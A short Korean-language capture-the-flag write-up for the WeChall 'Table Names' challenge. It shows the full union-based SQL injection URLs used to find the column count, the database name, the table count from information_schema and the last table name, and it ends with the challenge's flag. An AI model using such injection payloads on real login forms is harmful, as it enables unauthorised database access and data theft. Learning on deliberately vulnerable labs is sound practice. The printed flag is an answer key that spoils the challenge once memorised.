# [WeChall] Table Names - Writeup

로그인 페이지로부터 데이터베이스의 이름과 테이블 이름을 구해와야하는 SQL Injection 문제다.

___

## 1. Union Based SQL Injection
[http://www.wechall.net/challenge/table_names/challenge.php?username=%27union+select+1,2,3%23&password=&login=login](http://www.wechall.net/challenge/table_names/challenge.php?username=%27union+select+1,2,3%23&password=&login=login)

3개의 컬럼을 사용한다.

___

## 2. 데이터베이스 이름 추출

[http://www.wechall.net/challenge/table_names/challenge.php?username=%27union+select+database%28%29,2,3%23&password=&login=login](http://www.wechall.net/challenge/table_names/challenge.php?username=%27union+select+database%28%29,2,3%23&password=&login=login)
 
데이터베이스의 이름은 `gizmore_tableu61`이다.

___

## 3. 테이블 갯수 추출

[http://www.wechall.net/challenge/table_names/challenge.php?username=%27+union+select+count%28table_name%29,2,3+from+information_schema.tables%23&password=&login=login](http://www.wechall.net/challenge/table_names/challenge.php?username=%27+union+select+count%28table_name%29,2,3+from+information_schema.tables%23&password=&login=login)

테이블은 총 63개다. 

___

## 4. 마지막 테이블 이름 추출

[http://www.wechall.net/challenge/table_names/challenge.php?username=%27+union+select+%28table_name%29,2,3+from+information_schema.tables+limit+62,63%23&password=&login=login](http://www.wechall.net/challenge/table_names/challenge.php?username=%27+union+select+%28table_name%29,2,3+from+information_schema.tables+limit+62,63%23&password=&login=login)

마지막 테이블의 이름은 `usertableus4`이다.

___

## Answer

flag: `gizmore_tableu61_usertableus4`